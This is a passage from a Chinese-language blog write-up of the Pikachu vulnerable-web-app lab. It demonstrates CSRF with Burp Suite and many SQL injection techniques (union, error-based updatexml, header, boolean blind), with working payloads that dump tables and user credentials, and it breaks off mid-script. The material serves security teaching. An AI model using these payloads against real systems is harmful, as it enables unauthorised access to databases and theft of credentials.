<p><img src="https://img.vim-cn.com/21/55d81aea8c3a68d1a6fc98ff167ace9c1a8c69.png"></p>
<h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF( post )"></a>CSRF( post )</h2><p>以post方式进行提交请求的话就无法通过像get方式那样伪造url实现攻击，这时可以通过构造恶意站点，将POST请求隐藏在站点中的表单中，然后诱骗用户进行点击，当用户点击后触发表单，数据自然就POST到存在CSRF漏洞的网站，用户的信息则被恶意修改</p>
<p>演示 使用bp实现</p>
<p>修改一下，在bp中找到刚刚提交的post包（记得不要拦截</p>
<p><img src="https://img.vim-cn.com/b0/1bbec1a4b044c6ea9f99ef04bb9d2abb04957d.png"></p>
<p>将这个包传到 <code>Generate CSRF PoC</code></p>
<p><img src="https://img.vim-cn.com/d3/ed8d56634813dff72dd0484fc5ed90d724a3b9.png"></p>
<p>修改数据，并生成url 操作如下👇（也可点copy html，修改内容后放入对应站点下即可</p>
<p><img src="https://img.vim-cn.com/e7/86d713c5e8c8d6a4b176c51f5d766d3aadae6e.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;burpsuite&#x2F;show&#x2F;3&#x2F;2mahwy0tx746tboun3j4psftikhddv9v</span><br></pre></td></tr></table></figure>

<p><img src="https://img.vim-cn.com/e7/9aecbd2f450842585d87f898722f1453660ae9.png"></p>
<p>点击提交请求，即可发现信息修改成功</p>
<p><img src="https://img.vim-cn.com/c9/e43996934fc28e7b70f6be86bc26245fed14dc.png"></p>
<h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF( Token )"></a>CSRF( Token )</h2><p>原理：主要问题是敏感操作的链接容易被伪造。而只要在每次请求时都增加一个随机码<code>Token</code>，后台每次都对这个随机码进行验证，则可以有效地防止CSRF</p>
<p>在源码中可以发现👇</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;per_info&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;per_title&quot;</span>&gt;</span>hello,&#123;$name&#125;,欢迎来到个人会员中心 | <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color:bule;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;token_get.php?logout=1&quot;</span>&gt;</span>退出登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_name&quot;</span>&gt;</span>姓名:&#123;$name&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_sex&quot;</span>&gt;</span>性别:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$sex&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_phone&quot;</span>&gt;</span>手机:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$phonenum&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>    </span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_add&quot;</span>&gt;</span>住址:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$add&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_email&quot;</span>&gt;</span>邮箱:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$email&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">       </span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$_SESSION[&#x27;token&#x27;]&#125;&quot;</span> /&gt;</span></span><br><span class="line">       </span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;sub&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>每次刷新页面，都会刷新<code>token</code>，会把<code>SESSION</code>中<code>token</code>销毁，然后生成一个新的<code>token</code>，并将这个<code>token</code>传到前端表单中，每次提交表单时，这个<code>token</code>值就会传到后台与<code>SESSION</code>中的<code>token</code>进行比较，若不相等，此次表单则提交失败。所以黑客由于不能得知用户当前的<code>token</code>值，从而无法进行CSRF攻击</p>
<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><ol>
<li>增加验证码</li>
<li>进行较为安全的会话管理，设置会话过期时长</li>
<li>进行二次验证，如进行敏感操作时对用户身份进行二次认证</li>
</ol>
<h1 id="Sql-Inject-SQL注入"><a href="#Sql-Inject-SQL注入" class="headerlink" title="Sql Inject(SQL注入)"></a>Sql Inject(SQL注入)</h1><h2 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入( post )"></a>数字型注入( post )</h2><p><img src="https://img-blog.csdnimg.cn/20210201132535206.png" alt="在这里插入图片描述"><br>很明显是一个POST传参形式<br>所以直接用burpsuite抓包来进行sql注入</p>
<p><img src="https://img-blog.csdnimg.cn/20210201151706459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">ctrl+r发送到Repeater里<br>修改id的值进行注入</p>
<p>爆字段<br><img src="https://img-blog.csdnimg.cn/20210201152002801.png" alt="在这里插入图片描述">查看数据库名<br><img src="https://img-blog.csdnimg.cn/20210201152122654.png" alt="在这里插入图片描述">查看该数据库下的所有表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0 union select 1,concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201152305126.png" alt="在这里插入图片描述">爆users表中的字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0 union select 1,concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201152443306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">获取username和password数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0 union select username,password from users%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201152607769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">对应账号和MD5加密的密码：<br>admin：e10adc3949ba59abbe56e057f20f883e（123456）<br>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）<br>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
<h2 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入( get )"></a>字符型注入( get )</h2><p><img src="https://img-blog.csdnimg.cn/20210201152935585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">和上一个类似，只不过这个是字符型的，需要加上一个单引号 (‘) 来闭合</p>
<p>爆字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#39; order by 2#</span><br><span class="line"></span><br><span class="line">a&#39; order by 3#</span><br></pre></td></tr></table></figure>
<p>可以发现有两个字段<br><img src="https://img-blog.csdnimg.cn/2021020115325520.png" alt="在这里插入图片描述"><br>接着查数据库名和版本号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#39; union select database(),version()#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201153407287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查数据库中的表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161144361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查user表中的字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;user&#39;#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161321999.png" alt="在这里插入图片描述">查字段值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#39; union select group_concat(username),group_concat(password) from users#</span><br><span class="line">a&#39; union select group_concat(username),group_concat(password) from pikachu.users#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161641616.png" alt="在这里插入图片描述"></p>
<h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p><img src="https://img-blog.csdnimg.cn/20210201161750828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">爆字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#39; order by 3#</span><br><span class="line">a&#39; order by 4#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161959799.png" alt="在这里插入图片描述"><br>可以发现字段为3<br>看一下显示位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#39; union select 1,2,3#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201162118452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着就是类似之前的操作<br>依次查数据库名，表名，字段名，字段值就行了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a&#39; union select 1,database(),version()#</span><br><span class="line"></span><br><span class="line">a&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()#</span><br><span class="line"></span><br><span class="line">a&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line"></span><br><span class="line">a&#39; union select group_concat(id),group_concat(username),group_concat(password) from users#</span><br></pre></td></tr></table></figure>



<h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p><del>尝试用单引号闭合，发现不行，试一试双引号，还是不行，WTF??</del><br>尝试用’)闭合</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;) or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201162833211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着重复前边的操作依次查询就行了，注意闭合方式是用单引号加上小括号</p>
<p>我这直接爆username和password了<br><img src="https://img-blog.csdnimg.cn/20210201163135634.png" alt="在这里插入图片描述"></p>
<h2 id="insert-updata注入"><a href="#insert-updata注入" class="headerlink" title="insert/updata注入"></a>insert/updata注入</h2><p>插入和更新时的注入就需要用burp suite来抓包了<br>这里使用报错注入</p>
<h3 id="引入updatexml函数"><a href="#引入updatexml函数" class="headerlink" title="引入updatexml函数"></a>引入updatexml函数</h3><h4 id="函数解释："><a href="#函数解释：" class="headerlink" title="函数解释："></a>函数解释：</h4><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 <em>xml_target</em> 新的XML片段 <em>new_xml</em> ，然后返回更       改的XML。<em>xml_target</em>替换的部分 与<em>xpath_expr</em> 用户提供的XPath表达式匹配。如果未<em>xpath_expr</em>找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 <em>xml_target</em>XML片段。</p>
<h4 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h4><p>这里和extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容。</p>
<h4 id="约束条件"><a href="#约束条件" class="headerlink" title="约束条件"></a>约束条件</h4><p> 输出字符长度限制为32个字符</p>
<h4 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(代码),<span class="number">0x7e</span>),<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>用bp抓包</p>
<p>爆数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,database()),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201163855544.png" alt="在这里插入图片描述">爆表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021020212182937.png" alt="在这里插入图片描述">发现显示不完全，呃，超出长度了<br>尝试用left，mid，right来进行分段显示，将得到的信息进行拼接</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,left((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,mid((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,right((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202122232643.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/2021020212231394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210202122335881.png" alt="在这里插入图片描述">分成三段显示就可以看到全部内容了</p>
<p>爆字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,right((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202122514314.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210202122547898.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210202122631148.png" alt="在这里插入图片描述">接下来爆数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,(select group_concat(username) from users),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,left((select group_concat(password) from users),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202122755777.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210202123018270.png" alt="在这里插入图片描述"></p>
<h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p><img src="https://img-blog.csdnimg.cn/20210202123224348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击删除并抓包看看<br><img src="https://img-blog.csdnimg.cn/2021020212370529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>在id处进行报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">56</span><span class="operator">%</span><span class="number">20</span><span class="keyword">or</span><span class="operator">%</span><span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202123943418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">接下来就和上边大同小异了，就不多写了</p>
<h2 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http header注入"></a>http header注入</h2><p><a href="http://t0mrvvi1b3t.top/2021/04/29/http/">关于http头</a></p>
<h3 id="在User-Agent处注入"><a href="#在User-Agent处注入" class="headerlink" title="在User-Agent处注入"></a>在User-Agent处注入</h3><p>先随便登陆一下<br><img src="https://img-blog.csdnimg.cn/20210202135551902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210202135656799.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210202135734904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">爆数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="string">&#x27; or updatexml(1,concat(0x7e,database ()),0) or &#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202135818376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">接下来就和之前的差不多一样了，自己操作就行了</p>
<h3 id="在Cookie处注入"><a href="#在Cookie处注入" class="headerlink" title="在Cookie处注入"></a>在Cookie处注入</h3><p>还是一样的操作将第二个包发送到repeater<br><img src="https://img-blog.csdnimg.cn/20210202140258556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造语句：<span class="string">&#x27;and updatexml (1,concat(0x7e,database()),0)#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202140353275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这样也可以爆出数据库名</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#39; and ascii(substr(database(),1,1))&#x3D;112#</span><br></pre></td></tr></table></figure>

<p>有关函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">length()函数的作用是返回字符串str的长度，以字节为单位。一个多字节字符算作多字节。这意味着，对于包含四个两字节字符的字符串，length() 返回8,  而 char_length() 返回 4</span><br><span class="line"></span><br><span class="line">length(&#39;text&#39;)返回值为4</span><br><span class="line"></span><br><span class="line">substr()函数从特定位置开始的字符串返回一个给定长度的子字符串</span><br><span class="line">substr()函数有三个参数，用法为：substr(str,pos,len)</span><br><span class="line">str参数代表待截取的字符串</span><br><span class="line">pos参数代表从什么位置开始截取</span><br><span class="line">len参数表示字符串截取的长度</span><br><span class="line"></span><br><span class="line">ascii()函数可以输出某个字符的ascii码值，ascii码共127个，此处注意ascii函数处理单个字符，如果是字符串则会处理第一个字符</span><br></pre></td></tr></table></figure>

<p>原理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无法使用union来直接查询时，需要用到关键字and，只有and前后的条件都为真的时候，数据库才会输出结果。 将返回字符串的ascii与注入语句的ascii进行比较，相等时才会返回正常的页面，利用这个进行爆破即可</span><br></pre></td></tr></table></figure>

<p>可使用bp进行爆破也可写python脚本</p>
<p><del>经过几个小时的奋战，终于整完了python脚本 hahahah</del></p>
<p>爆破数据库的python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1=<span class="string">&quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=kobe%s&amp;submit=查询&quot;</span></span><br><span class="line">url2=<span 